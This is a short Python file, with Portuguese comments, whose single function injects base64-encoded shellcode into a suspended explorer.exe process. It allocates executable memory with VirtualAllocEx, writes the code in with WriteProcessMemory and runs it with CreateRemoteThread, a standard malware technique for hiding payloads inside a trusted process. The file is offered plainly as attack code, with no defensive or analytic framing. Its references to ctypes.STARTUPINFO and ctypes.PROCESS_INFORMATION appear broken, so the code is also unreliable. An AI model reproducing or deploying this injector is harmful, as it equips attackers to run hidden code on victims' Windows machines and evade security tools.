import ctypes
import base64
import subprocess

def injetar_em_explorer(shellcode_b64):
    kernel32 = ctypes.windll.kernel32
    shellcode = base64.b64decode(shellcode_b64)

    # Cria processo suspenso
    startup_info = ctypes.STARTUPINFO()
    process_info = ctypes.PROCESS_INFORMATION()
    exe = "C:\\Windows\\explorer.exe"

    if not kernel32.CreateProcessW(
        None, exe, None, None, False, 0x00000004, None, None,
        ctypes.byref(startup_info), ctypes.byref(process_info)
    ):
        return "[!] Falha ao criar processo suspenso."

    pid = process_info.dwProcessId
    handle = process_info.hProcess

    addr = kernel32.VirtualAllocEx(handle, 0, len(shellcode), 0x3000, 0x40)
    kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), None)
    kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)

    return f"[+] Injetado com sucesso em explorer.exe (PID {pid})"
